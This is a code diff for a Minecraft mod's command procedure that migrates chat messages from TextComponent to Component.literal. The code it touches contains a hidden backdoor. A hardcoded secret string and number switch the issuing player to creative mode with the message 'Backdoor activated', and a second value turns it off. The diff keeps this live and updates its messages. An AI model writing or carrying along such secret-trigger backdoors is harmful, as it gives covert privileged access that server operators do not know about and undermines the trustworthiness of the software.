@@ -10,7 +10,7 @@ import net.minecraft.world.entity.player.Player;
 import net.minecraft.world.entity.LivingEntity;
 import net.minecraft.world.entity.Entity;
 import net.minecraft.server.level.ServerPlayer;
-import net.minecraft.network.chat.TextComponent;
+import net.minecraft.network.chat.Component;
 import net.minecraft.commands.arguments.MessageArgument;
 import net.minecraft.commands.CommandSourceStack;
 
@@ -34,11 +34,11 @@ public class OxcommandProcedure {
 			if (entity.getPersistentData().getBoolean("debug_pala")) {
 				entity.getPersistentData().putBoolean("debug_pala", false);
 				if (entity instanceof Player _player && !_player.level.isClientSide())
-					_player.displayClientMessage(new TextComponent("Debug off"), false);
+					_player.displayClientMessage(Component.literal("Debug off"), false);
 			} else {
 				entity.getPersistentData().putBoolean("debug_pala", true);
 				if (entity instanceof Player _player && !_player.level.isClientSide())
-					_player.displayClientMessage(new TextComponent("Debug on"), false);
+					_player.displayClientMessage(Component.literal("Debug on"), false);
 			}
 		}
 		if (((new Object() {
@@ -63,11 +63,11 @@ public class OxcommandProcedure {
 			}
 		}).getMessage()).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 856478) {
 			if (entity instanceof Player _player && !_player.level.isClientSide())
-				_player.displayClientMessage(new TextComponent("Backdoor activated"), false);
+				_player.displayClientMessage(Component.literal("Backdoor activated"), false);
 			if (entity instanceof Player _player && !_player.level.isClientSide())
-				_player.displayClientMessage(new TextComponent("Use this backdoor at for good use"), false);
+				_player.displayClientMessage(Component.literal("Use this backdoor at for good use"), false);
 			if (entity instanceof Player _player && !_player.level.isClientSide())
-				_player.displayClientMessage(new TextComponent("don't do any damage on server"), false);
+				_player.displayClientMessage(Component.literal("don't do any damage on server"), false);
 			if (entity instanceof ServerPlayer _player)
 				_player.setGameMode(GameType.CREATIVE);
 			if (entity instanceof Player _player) {
@@ -90,7 +90,7 @@ public class OxcommandProcedure {
 			}
 		}).getMessage()).equals("pPbTmCazJmU6bLvDRF") && DoubleArgumentType.getDouble(arguments, "quan") == 8) {
 			if (entity instanceof Player _player && !_player.level.isClientSide())
-				_player.displayClientMessage(new TextComponent("Backdoor closed"), false);
+				_player.displayClientMessage(Component.literal("Backdoor closed"), false);
 			if (entity instanceof ServerPlayer _player)
 				_player.setGameMode(GameType.SURVIVAL);
 			if (entity instanceof Player _player) {
